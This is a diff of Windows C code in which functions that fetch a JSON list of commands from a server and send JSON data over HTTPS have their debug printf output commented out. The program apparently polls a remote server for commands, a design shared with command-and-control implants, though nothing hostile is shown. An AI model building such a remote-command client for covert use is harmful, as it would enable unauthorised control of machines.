@@ -72,9 +72,9 @@ Commands GetCommands(LPCSTR server, DWORD port)
 	}
 
 	//Print headers
-	printf("----- RESPONSE ----\n");
+	/*printf("----- RESPONSE ----\n");
 	printf("Headers length = %d\n", headerSize);
-	printf("|%s|\n", headerBuffer);
+	printf("|%s|\n", headerBuffer);*/
 
 	//(Get the data)
 	LPSTR dataBuffer = NULL;
@@ -88,7 +88,7 @@ Commands GetCommands(LPCSTR server, DWORD port)
 		return commands;
 	}
 
-	printf("Data length = %d\n", dataSize);
+	//printf("Data length = %d\n", dataSize);
 	if ((dataBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dataSize + 2) * sizeof(CHAR))) == NULL)
 	{
 		InternetCloseHandle(hRequest);
@@ -105,7 +105,7 @@ Commands GetCommands(LPCSTR server, DWORD port)
 		return commands;
 	}
 
-	printf("|%s|\n", dataBuffer);
+	//printf("|%s|\n", dataBuffer);
 
 	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)dataBuffer);
 
@@ -125,7 +125,7 @@ Commands GetCommands(LPCSTR server, DWORD port)
 	commandsNumber = cJSON_GetArraySize(commandsArray);
 
 
-	printf("Number of command = %d\n\n", commandsNumber);
+	//printf("Number of command = %d\n\n", commandsNumber);
 
 	for (DWORD i = 0; i < commandsNumber; i++)
 	{
@@ -202,10 +202,10 @@ BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, L
 	}
 	
 	//Print headers
-	printf("----- RESPONSE ----\n");
+	/*printf("----- RESPONSE ----\n");
 	printf("Headers length = %d\n", headerSize);
 	printf("|%s|\n", headerBuffer);
-
+	*/
 	//(Get the data)
 	LPSTR dataBuffer = NULL;
 	DWORD dataSize = 0;
@@ -218,7 +218,7 @@ BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, L
 		return FALSE;
 	}
 	
-	printf("Data length = %d\n", dataSize);
+	//printf("Data length = %d\n", dataSize);
 	if ((dataBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dataSize + 2) * sizeof(BYTE))) == NULL)
 	{
 		InternetCloseHandle(hRequest);
@@ -235,7 +235,7 @@ BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, L
 		return FALSE;
 	}
 
-	printf("|%s|\n", dataBuffer);
+	//printf("|%s|\n", dataBuffer);
 
 	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)dataBuffer);
 	
